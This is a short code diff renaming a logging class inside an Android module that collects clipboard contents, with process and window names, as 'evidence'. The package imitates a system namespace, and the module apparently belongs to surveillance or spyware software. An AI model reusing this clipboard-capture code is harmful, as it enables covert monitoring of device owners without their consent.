@@ -19,7 +19,7 @@ import com.android.networking.auto.Cfg;
 import com.android.networking.conf.ConfModule;
 
 import com.android.networking.evidence.EvidenceType;
-import com.android.networking.evidence.LogR;
+import com.android.networking.evidence.EvidenceReference;
 import com.android.networking.interfaces.IncrementalLog;
 import com.android.networking.util.ByteArray;
 import com.android.networking.util.Check;
@@ -33,11 +33,11 @@ public class ModuleClipboard extends BaseModule implements IncrementalLog {
 	ClipboardManager clipboardManager;
 	static String lastClip = ""; //$NON-NLS-1$
 
-	LogR logIncremental;
+	EvidenceReference logIncremental;
 
 	@Override
 	public void actualStart() {
-		logIncremental = new LogR(EvidenceType.CLIPBOARD);
+		logIncremental = new EvidenceReference(EvidenceType.CLIPBOARD);
 		clipboardManager = (ClipboardManager) Status.getAppContext().getSystemService(Context.CLIPBOARD_SERVICE);
 		if (Cfg.DEBUG) {
 			Check.ensures(clipboardManager != null, "Null clipboard manager"); //$NON-NLS-1$
@@ -81,7 +81,7 @@ public class ModuleClipboard extends BaseModule implements IncrementalLog {
 		items.add(process);
 		items.add(window);
 		items.add(payload);
-		items.add(ByteArray.intToByteArray(LogR.E_DELIMITER));
+		items.add(ByteArray.intToByteArray(EvidenceReference.E_DELIMITER));
 
 		if (Cfg.DEBUG) {
 			Check.asserts(logIncremental != null, "null log"); //$NON-NLS-1$
@@ -98,7 +98,7 @@ public class ModuleClipboard extends BaseModule implements IncrementalLog {
 		}
 		if (logIncremental.hasData()) {
 			logIncremental.close();
-			logIncremental = new LogR(EvidenceType.CLIPBOARD);
+			logIncremental = new EvidenceReference(EvidenceType.CLIPBOARD);
 		}
 	}
 
